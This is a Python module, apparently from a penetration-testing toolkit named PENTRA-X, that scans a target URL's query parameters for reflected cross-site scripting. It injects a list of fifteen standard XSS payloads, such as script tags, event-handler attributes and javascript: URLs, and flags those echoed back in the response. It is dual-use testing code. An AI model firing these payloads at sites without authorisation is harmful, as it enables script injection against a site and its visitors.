#!/usr/bin/env python3
"""
PENTRA-X XSS Testing Module
Cross-Site Scripting vulnerability testing.
"""

import requests
from typing import Optional, List, Dict
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from ...core.colors import Colors, success, error, info, warning, header
from ...core.utils import safe_input, safe_press_enter, validate_url
from ...core.spinner import ProgressBar
from ...core.logging import get_logger, log_result
from ...core.config import get_config


# XSS Payloads
XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '"><script>alert("XSS")</script>',
    "'-alert('XSS')-'",
    '<body onload=alert("XSS")>',
    '<iframe src="javascript:alert(\'XSS\')">',
    '<input onfocus=alert("XSS") autofocus>',
    '<marquee onstart=alert("XSS")>',
    '<details open ontoggle=alert("XSS")>',
    '<a href="javascript:alert(\'XSS\')">Click</a>',
    '"><img src=x onerror=alert("XSS")>',
    "{{constructor.constructor('alert(1)')()}}",
    "${alert('XSS')}",
    '<div style="background:url(javascript:alert(\'XSS\'))">',
]


def xss_test(url: Optional[str] = None) -> Optional[List[Dict]]:
    """
    Test URL for XSS vulnerabilities.
    
    Args:
        url: Target URL with parameters
        
    Returns:
        List of found vulnerabilities or None
    """
    logger = get_logger()
    config = get_config()
    
    header("XSS Vulnerability Tester")
    
    # Get URL
    if not url:
        url = safe_input(f"{Colors.OKGREEN}Enter target URL (with parameters): {Colors.ENDC}")
        if not url:
            return None
        url = url.strip()
    
    if not url:
        error("URL required")
        safe_press_enter()
        return None
    
    # Parse URL
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        warning("No parameters found in URL")
        info("Example: http://example.com/search?q=test")
        safe_press_enter()
        return None
    
    info(f"Found parameters: {list(params.keys())}")
    
    # Get user agent from config
    user_agent = config.get('web.user_agent', 'Mozilla/5.0')
    timeout = config.get('web.timeout', 10)
    
    headers = {'User-Agent': user_agent}
    
    logger.tool_start("XSS Test", url)
    
    vulnerabilities = []
    total_tests = len(params) * len(XSS_PAYLOADS)
    
    progress = ProgressBar(total_tests, "Testing XSS payloads")
    
    try:
        for param_name, param_values in params.items():
            info(f"Testing parameter: {param_name}")
            
            for payload in XSS_PAYLOADS:
                progress.update()
                
                # Create test URL with payload
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme,
                    parsed.netloc,
                    parsed.path,
                    parsed.params,
                    new_query,
                    parsed.fragment
                ))
                
                try:
                    response = requests.get(test_url, headers=headers, timeout=timeout)
                    
                    # Check if payload is reflected
                    if payload in response.text:
                        vuln = {
                            'parameter': param_name,
                            'payload': payload,
                            'url': test_url,
                            'type': 'Reflected XSS'
                        }
                        vulnerabilities.append(vuln)
                        print(f"\n{Colors.OKGREEN}[VULN] {param_name}: {payload[:50]}...{Colors.ENDC}")
                        
                except requests.Timeout:
                    pass
                except Exception as e:
                    pass
        
        progress.finish()
        
        # Results
        if vulnerabilities:
            success(f"Found {len(vulnerabilities)} potential XSS vulnerabilities!")
            
            print(f"\n{Colors.OKCYAN}Vulnerable Points:{Colors.ENDC}")
            for i, vuln in enumerate(vulnerabilities, 1):
                print(f"  {i}. Parameter: {vuln['parameter']}")
                print(f"     Payload: {vuln['payload'][:60]}...")
                print()
            
            log_result("xss_test", str(vulnerabilities))
        else:
            warning("No XSS vulnerabilities found")
        
        logger.tool_end("XSS Test", success=True)
        safe_press_enter()
        return vulnerabilities
        
    except KeyboardInterrupt:
        warning("Scan interrupted")
        logger.tool_end("XSS Test", success=False)
        safe_press_enter()
        return vulnerabilities
    except Exception as e:
        error(f"Test failed: {e}")
        logger.tool_end("XSS Test", success=False)
        safe_press_enter()
        return None


if __name__ == "__main__":
    xss_test()
